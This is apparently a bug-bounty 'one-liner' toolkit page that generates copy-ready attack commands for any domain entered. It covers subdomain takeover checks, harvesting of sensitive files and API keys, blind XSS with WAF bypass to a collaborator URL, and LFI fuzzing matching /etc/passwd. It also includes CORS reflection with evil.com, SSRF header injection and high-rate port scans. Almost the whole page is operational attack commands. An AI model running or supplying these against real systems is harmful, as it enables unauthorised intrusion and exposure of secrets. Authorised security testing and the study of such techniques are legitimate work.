# Advanced Bug Hunting Toolkit

Enter a domain to generate all oneliners commands

Command copied to clipboard!

## Subdomain Enumeration

### Basic Subdomain Discovery

Discovers subdomains using subfinder with recursive enumeration and saves results to a file.

subfinder -d example.com -all -recursive > subexample.com.txt

### Live Subdomain Filtering

Filters discovered subdomains using httpx and saves the alive ones to a file.

cat subexample.com.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subexample.coms_alive.txt

### Subdomain Takeover Check

Checks for subdomain takeover vulnerabilities using subzy.

subzy run --targets subexample.coms.txt --concurrency 100 --hide_fails --verify_ssl

## URL Collection

### Passive URL Collection

Collects URLs from various sources and saves them to a file.

katana -u subexample.coms_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt

### Advanced URL Fetching

Collects URLs from various sources and saves them to a file.

echo example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe >output.txtkatana -u https://example.com -d 5 | grep '=' | urldedupe | anew output.txtcat output.txt | sed 's/=.*/=/' >final.txt

### GAU URL Collection

Collects URLs using GAU and saves them to a file.

echo example.com | gau --mc 200 | urldedupe >urls.txtcat urls.txt | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep '=' | sort > output.txtcat output.txt | sed 's/=.*/=/' >final.txt

## Sensitive Data Discovery

### Sensitive File Detection

Detects sensitive files on the web server.

cat allurls.txt | grep -E "\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5"

### Information Disclosure Dork

Searches for information disclosure vulnerabilities using a dork.

site:*.example.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)

### Git Repository Detection

Detects Git repositories on the web server.

cat example.coms.txt | grep "SUCCESS" | gf urls | httpx-toolkit -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe

### Information Disclosure Scanner

Checks for information disclosure vulnerabilities using a scanner.

echo https://example.com | gau | grep -E "\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"

### AWS S3 Bucket Finder

Searches for AWS S3 buckets associated with the target.

s3scanner scan -d example.com

### API Key Finder

Searches for exposed API keys and tokens in JavaScript files.

cat allurls.txt | grep -E "\.js$" | httpx-toolkit -mc 200 -content-type | grep -E "application/javascript|text/javascript" | cut -d' ' -f1 | xargs -I% curl -s % | grep -E "(API_KEY|api_key|apikey|secret|token|password)"

## XSS Testing

### XSS Hunting Pipeline

Collects XSS vulnerabilities using various tools and saves them to a file.

echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt

### XSS with Dalfox

Uses Dalfox to scan for XSS vulnerabilities.

cat xss_params.txt | dalfox pipe --blind https://your-collaborator-url --waf-bypass --silence

### Stored XSS Finder

Finds potential stored XSS vulnerabilities by scanning forms.

cat urls.txt | grep -E "(login|signup|register|forgot|password|reset)" | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/xss/ -severity critical,high

### DOM XSS Detection

Detects potential DOM-based XSS vulnerabilities.

cat js_files.txt | Gxss -c 100 | sort -u | dalfox pipe -o dom_xss_results.txt

## LFI Testing

### LFI Methodology

Tests for Local File Inclusion (LFI) vulnerabilities using various methods.

echo "https://example.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v

## CORS Testing

### Basic CORS Check

Checks the Cross-Origin Resource Sharing (CORS) policy of a website.

curl -H "Origin: http://example.com" -I https://example.com/wp-json/

### CORScanner

Fast CORS misconfiguration scanner that helps identify potential CORS vulnerabilities.

python3 CORScanner.py -u https://example.com -d -t 10

### CORS Nuclei Scan

Uses Nuclei to scan for CORS misconfigurations across multiple domains.

cat example.coms.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt

### CORS Origin Reflection Test

Tests for origin reflection vulnerability in CORS configuration.

curl -H "Origin: https://evil.com" -I https://example.com/api/data | grep -i "access-control-allow-origin: https://evil.com"

## WordPress Scanning

### Aggressive WordPress Scan

Scans a WordPress website for vulnerabilities and saves the results to a file.

wpscan --url https://example.com --disable-tls-checks --api-token YOUR_TOKEN -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force

## Network Scanning

### Naabu Scan

Scans for open ports and services using Naabu.

naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt

### Nmap Full Scan

Performs a full port scan using Nmap.

nmap -p- --min-rate 1000 -T4 -A example.com -oA fullscan

### Masscan

Scans for open ports and services using Masscan.

masscan -p0-65535 example.com --rate 100000 -oG masscan-results.txt

## Bug Bounty Methodologies

### Advanced Recon Methodology

methodology recon

View Methodology

### Gather assets through API

methodology recon api

View Methodology

### SSTI Payloads

payloads injection

View Methodology

### CRLF Injection

payloads injection headers

View Methodology

### SQL Injection Methodology

methodology payloads sqli

View Methodology

### XSS WAF Bypass Methodology

xss bypass payloads

View Methodology

### SQL Injection XOR WAF Bypass

sqli xor payloads

View Methodology

### Advanced Google Dorks

google-hacking google-dork

View Methodology

## Parameter Discovery

### Arjun Passive

Passively discovers parameters using Arjun.

arjun -u https://example.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"

### Arjun Wordlist

Uses Arjun to discover parameters using a custom wordlist.

arjun -u https://example.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers "User-Agent: Mozilla/5.0"

## JavaScript Analysis

### JS File Hunting

Collects JavaScript files from a website and analyzes them.

echo example.com | katana -d 5 | grep -E "\.js$" | nuclei -t /path/to/nuclei-templates/http/exposures/ -c 30

### JS File Analysis

Analyzes collected JavaScript files.

cat alljs.txt | nuclei -t /path/to/nuclei-templates/http/exposures/

## Content Type Filtering

### Content Type Check

Checks the content type of URLs.

echo example.com | gau | grep -Eo '(\/[^\/]+)\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'

### JavaScript Content Check

Checks for JavaScript content in URLs.

echo example.com | gau | grep '\.js-php-jsp-other extens$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'

## Shodan Dorks

### SSL Certificate Search

Searches for SSL certificates using Shodan.

Ssl.cert.subject.CN:"example.com" 200

## FFUF Request File Method

### LFI with Request File

Uses FFUF to bruteforce LFI vulnerabilities using a request file.

ffuf -request lfi -request-proto https -w /root/wordlists/offensive\ payloads/LFI\ payload.txt -c -mr "root:"

### XSS with Request File

Uses FFUF to bruteforce XSS vulnerabilities using a request file.

ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr "<script>alert('XSS')</script>"

## Advanced Techniques

### XSS/SSRF Header Testing

Tests for XSS and SSRF vulnerabilities using various methods.

cat example.coms.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotor'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotor'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotor'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://xss.yourburpcollabrotor HTTP/1.1 ""\n";done

[Join Telegram](https://t.me/lostsec6)

[](https://github.com/coffinxp "GitHub")